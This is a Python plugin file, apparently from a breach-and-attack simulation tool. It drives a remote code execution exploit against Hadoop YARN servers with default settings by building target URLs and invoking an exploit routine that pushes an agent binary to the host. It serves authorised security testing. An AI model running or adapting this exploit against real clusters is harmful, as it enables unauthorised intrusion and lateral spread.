"""
    Remote code execution on HADOOP server with YARN and default settings
    Implementation is based on code from
    https://github.com/vulhub/vulhub/tree/master/hadoop/unauthorized-yarn
"""

import logging
from typing import Any, Dict, Sequence
from uuid import UUID

# common imports
from common.event_queue import IAgentEventPublisher
from common.types import Event
from common.utils.code_utils import del_key

# dependencies to get rid of or internalize
from infection_monkey.exploit import IAgentBinaryRepository
from infection_monkey.exploit.tools.http_tools import HTTPTools
from infection_monkey.exploit.tools.web_tools import build_urls
from infection_monkey.i_puppet import ExploiterResultData
from infection_monkey.model import TargetHost

from .hadoop import Hadoop
from .hadoop_command_builder import HadoopCommandBuilder
from .hadoop_options import HadoopOptions

logger = logging.getLogger(__name__)


class Plugin:
    def __init__(
        self,
        *,
        plugin_name: str,
        agent_id: UUID,
        agent_event_publisher: IAgentEventPublisher,
        agent_binary_repository: IAgentBinaryRepository,
        **kwargs,
    ):
        self._agent_id = agent_id
        self._agent_event_publisher = agent_event_publisher
        self._agent_binary_repository = agent_binary_repository

    def run(
        self,
        *,
        host: TargetHost,
        servers: Sequence[str],
        current_depth: int,
        options: Dict[str, Any],
        interrupt: Event,
        **kwargs,
    ) -> ExploiterResultData:
        self.servers = servers
        self.current_depth = current_depth

        # HTTP ports options are hack because they are needed in fingerprinters
        del_key(options, "http_ports")
        hadoop_options = HadoopOptions(**options)
        hadoop_exploit = Hadoop(
            host,
            hadoop_options,
            interrupt,
            self._agent_id,
            self._agent_event_publisher,
            self._agent_binary_repository,
            servers,
            current_depth,
        )

        try:
            # Try to get potential urls
            potential_urls = build_urls(
                str(host.ip), [(str(p), False) for p in hadoop_options.target_ports]
            )
            build_command = HadoopCommandBuilder(host, servers, current_depth)
            return hadoop_exploit.exploit_urls(
                potential_urls, HTTPTools.create_locked_transfer, build_command
            )
        except Exception:
            logger.exception("Exception in exploit_host")
            return ExploiterResultData()
